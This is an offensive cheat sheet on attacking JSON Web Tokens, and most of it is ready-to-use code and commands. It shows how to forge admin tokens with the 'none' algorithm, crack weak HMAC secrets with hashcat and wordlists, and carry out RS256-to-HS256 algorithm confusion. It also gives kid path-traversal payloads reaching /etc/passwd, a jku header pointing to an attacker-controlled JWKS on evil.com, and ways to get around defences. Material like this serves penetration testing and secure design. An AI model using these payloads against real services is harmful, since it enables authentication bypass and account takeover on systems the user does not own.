# JWT Attacks: Full Exploitation Chain

## Decode & Analyze
```bash
# Decode header + payload (no verification)
echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx' | cut -d. -f1-2 | base64 -d
# Or use jwt.io or jwt_tool
```

## None Algorithm Attack
```python
import jwt
token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
```
Condition: Server does not enforce algorithm validation.

## Weak HMAC Secret
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py token -C -d common_secrets.txt
```
Common weak secrets: secret, password, key, changeme, 123456, admin, jwt_secret

## Algorithm Confusion (RS256 -> HS256)
```python
# Use PUBLIC key as HMAC secret
pubkey = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
-----END PUBLIC KEY-----"""
token = jwt.encode({"user": "admin"}, key=pubkey, algorithm="HS256")
```
Condition: Server accepts HS256 but expects RS256.

### Finding Public Key
```bash
curl https://target.com/.well-known/jwks.json
curl https://target.com/api/jwks
openssl s_client -connect target.com:443 </dev/null | openssl x509 -pubkey -noout
```

## kid Injection (Path Traversal)
```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}
```
Key is empty file -> sign with empty key.
Other variants: `../../../etc/passwd` (file read via error), SQLi in key lookup.

## jku/x5u Header Manipulation
```json
{"alg": "RS256", "jku": "https://evil.com/jwks.json", "kid": "evil-key"}
```
Host attacker-controlled JWKS on evil.com.

## JWK Embedded Attack
```json
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB", "d": "..."}}
```
Some libraries trust embedded JWK without verifying provenance.

## Defense Circumvention
When server validates JWT properly, look for:
- JWT in URL query strings (logging leak)
- JWT in WebSocket messages
- JWT in POST body (non-standard)
- JWT not expiring on logout
